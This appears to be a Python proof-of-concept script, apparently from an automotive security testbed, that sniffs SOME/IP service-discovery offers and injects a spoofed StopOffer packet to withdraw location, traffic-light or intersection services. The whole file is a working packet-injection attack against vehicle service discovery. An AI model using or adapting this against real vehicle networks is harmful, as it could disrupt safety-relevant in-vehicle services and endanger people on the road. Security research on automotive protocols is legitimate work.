from scapy.all import *
from scapy.contrib.automotive.someip import *

from common import update_udp_chksum
from common import get_someip_service_info
from common import get_someip_packet
from common import SOMEIP_MSG
import time
from datetime import datetime
import struct
import numpy as np
import json
import pdb
import pickle



with open('stopoffer-location.pkl', 'rb') as f:
    stopoffer_location = pickle.load(f)

with open('stopoffer-trafficlight.pkl', 'rb') as f:
    stopoffer_trafficlight = pickle.load(f)

with open('stopoffer-intersection.pkl', 'rb') as f:
    stopoffer_intersection = pickle.load(f)

stopoffers = [
    stopoffer_location,
    stopoffer_trafficlight,
    stopoffer_intersection
]

def handle_offer(packet):
    global stopoffers

    if packet[SD]:
        stopoffer_packet = stopoffers[int(sys.argv[1])-1]
        stopoffer_packet[SOMEIP].session_id = packet[SOMEIP].session_id + 0x01
        sendp(stopoffer_packet, iface='veth0.3')
        print("Send StopOffer & Exit!")
        exit(0)

def main():
    filter = "udp and src host 10.0.3.8 and src port 30490"
    sniff(filter=filter, iface='veth0.3', prn=handle_offer)

if __name__ == "__main__":
    main()


